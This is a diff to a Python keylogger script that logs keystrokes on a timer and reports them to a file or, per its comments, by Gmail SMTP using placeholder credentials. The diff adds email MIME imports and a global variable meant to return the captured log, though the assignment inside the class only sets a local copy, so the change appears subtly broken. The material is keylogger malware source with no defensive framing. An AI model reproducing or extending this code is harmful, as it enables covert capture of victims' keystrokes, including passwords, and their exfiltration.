@@ -5,10 +5,13 @@ import smtplib # for sending email using SMTP protocol (gmail)
 # Timer is to make a method runs after an `interval` amount of time
 from threading import Timer
 from datetime import datetime
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
 SEND_REPORT_EVERY = 30 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "email@provider.tld"
 EMAIL_PASSWORD = "password_here"
+return_msg = ""
 
 def run(**args):
     # if you want a keylogger to send to your email
@@ -17,6 +20,8 @@ def run(**args):
     # (and then send it using your favorite method)
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     keylogger.start()
+    if return_msg != "":
+        return return_msg
 
 class Keylogger:
     def __init__(self, interval, report_method="file"):
@@ -107,6 +112,7 @@ class Keylogger:
         It basically sends keylogs and resets `self.log` variable
         """
         if self.log:
+            return_msg = self.log
             # if there is something in log, report it
             self.end_dt = datetime.now()
             # update `self.filename`
@@ -124,6 +130,7 @@ class Keylogger:
         timer.daemon = True
         # start the timer
         timer.start()
+        
         
     def start(self):
         # record the start datetime
